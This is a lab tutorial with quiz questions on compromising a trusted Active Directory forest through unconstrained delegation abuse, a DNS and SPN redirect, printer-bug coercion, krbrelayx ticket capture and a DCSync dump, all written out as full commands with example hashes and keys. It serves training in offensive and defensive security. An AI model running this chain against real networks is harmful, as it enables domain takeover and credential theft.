#Attacking Forest Trusts

In this attack, we'll target an inter-forest trust relationship: The Forest trust between the sirius and altair domains.
An SID injection attack won't work by default on these trusts, since SID Filtering is enabled. What can work is, for example, Unconstrained Delegation Abuse.

We've tackled this attack on the Unconstrained Delegation Abuse section. This time, we'll use CHIEF as the compromised service account, and KING as the victim. DC's are both allowed for unconstrained delegation and allow their account to be delegated through delegation mechanisms in Kerberos. Also, in order for this attack to work, the forest trust must allow Kerberos tickets to be delegated, as well as being a bidirectional trust relationship. One-way forest trusts, or forest trusts that do not allow ticket delegation cannot be attacked in this manner. 

Through the use of the ldeep tool, we understand that delegation is enabled in the forest trust, due to the presence of the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag in the trustAttributes attribute. We can also determine that the trust is bidirectional. We can check again:
```
ldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.30 trusts
```

Let's then setup the Unconstrained delegation abuse scenario. First, we'll access the CHIEF machine as an Administrator (we've already compromised it on Trustpocalypse for example) through the wmiexec.py script. Then we'll create a new SPN as well as a DNS record resolving the SPN’s hostname to the attacker’s IP.
```
#remember to use the hashes from your own environment, this is just an example.
#the wmiexec.py script allows the attacker to issue commands to the target machine
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -no-pass ALTAIR/Administrator@chief.altair.local
#create an SPN record
powershell -Command "SetSPN -A HOST/attackingforest.altair.local CHIEF$"
#check the newly created SPN
powershell -Command "SetSPN -L CHIEF$" 
#create a DNS record for the SPN that points to the attacker's machine
powershell -Command "Add-DnsServerResourceRecordA -Name "attackingforest" -ZoneName "altair.local" -IPv4Address 192.168.122.2 -TimeToLive 01:00:00"
#check DNS record
powershell -Command "nslookup attackingforest.altair.local"
```

Now there’s an SPN associated to the CHIEF domain controller, which resolves to the attacker's machine due to the DNS record. This will be how we’ll trick the KING domain controller to send us its TGT. It is supposedly authenticating to a service pertaining to the CHIEF domain controller, thus it sends its TGT to the service (since CHIEF's configured for unconstrained delegation). Then, it will resolve the SPN through DNS, and end up sending the TGT to the attacker’s machine.

What's left for the attacker to do is to coerce KING authentication, using the printer bug, and extract KING's TGT from Kerberos messages. Once the attacker holds this TGT, the sirius domain can then be compromised, since the attacker can impersonate the KING DC.

```
#retrieve CHIEF's aes key that will be used to cipher the TGT sent by KING
#the kerberos ticket used here was retrieved in the Trustpocalypse attack. Please execute that attack first.
secretsdump.py -k -no-pass berntheman@chief.altair.local
#[+]ALTAIR\CHIEF$:aad3b435b51404eeaad3b435b51404ee:143b50cff65b459efa236693abbb4017:::
#[+]CHIEF$:aes256-cts-hmac-sha1-96:edeb40f907993b6316c58d7a723bd69035ce635dd52f22abb5892daa700df615
#now let's start krbrelayx script. We'll have to stop the DNS service in our machine, the script will need to use that port
#remember that the hash values may differ. Use your own hash values.

#in one terminal
#navigate to the krbrelayx directory
systemctl stop systemd-resolved 
#use CHIEF$:aes256-cts-hmac-sha1-96 value here
sudo -E python3 krbrelayx.py -aesKey edeb40f907993b6316c58d7a723bd69035ce635dd52f22abb5892daa700df615

#now, trigger the printer bug from a different terminal
#use CHIEF hash values here, which you can also retrieve from the secretsdump script output
python3 printerbug.py --verbose -hashes aad3b435b51404eeaad3b435b51404ee:143b50cff65b459efa236693abbb4017 altair.local/CHIEF\$@king.sirius.local attackingforest.altair.local

#in the end we can turn DNS on our machine on again
systemctl start systemd-resolved 
```

And there it is, the krbrelayx script has retrieved KING's TGT! By stealing KING’s TGT, the attacker can now impersonate the Domain Controller of the sirius domain, allowing full compromise of sirius through tools like secretsdump.

```
export KRB5CCNAME=/home/ubuntu/krbrelayx/KING\$@SIRIUS.LOCAL_krbtgt@SIRIUS.LOCAL.ccache
secretsdump.py -k -no-pass -just-dc-ntlm sirius.local/KING\$@KING.sirius.local
```

Note: The SPN has to be correctly set in the CHIEF domain controller before triggering authentication and stealing the TGT. Sometimes the SPN disappears for some reason. If you’re having trouble retrieving the ticket with krbrelayx (like NTLM being used instead of Kerberos), make sure the SPN is well set. I recommend to get familiar with the commands first, then, set the SPN through the wmiexec.py script and quicly start krbrelayx and trigger the printerbug. If you’re quick enough you can definitely get the ticket. 




!!! question
    Why can't the attacker use SID injection in this forest trust attack?
??? success "Answer"
    Because SID Filtering is enabled by default in forest trusts, extra SIDs like the Enterprise Admin SID would be stripped from the ticket, making SID injection attacks ineffective.
!!! question 
    What conditions must be met for this unconstrained delegation attack to succeed?
??? success "Answer"
    The forest trust must be bidirectional, allow Kerberos delegation across the trust, and the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag must be set. Also, the compromised machine (CHIEF) must have unconstrained delegation enabled, which DCs do by default, and the attacker must be able to coerce authentication from a DC in the other forest.
!!! question
    What's krbrelayx.py role in this attack?
??? success "Answer"
    krbrelayx.py listens for incoming Kerberos authentication, intercepts the TGT sent by the victim DC (KING), decrypts it using the known AES key of CHIEF, and saves it for reuse, allowing the attacker to impersonate KING and compromise the sirius domain.
!!! question
    Could the attacker, from CAPTAIN, use this attack to compromise CHIEF, instead of the SID-injection attack from Trustpocalypse section?
??? success "Answer"
    Yes, this attack could also be perpetrated from CAPTAIN to CHIEF, given that they are both DCs, thus allowing this unconstrained delegation abuse attack to happen as well. This attack could be done if for example, the trust between north and altair had SID-filtering enabled.

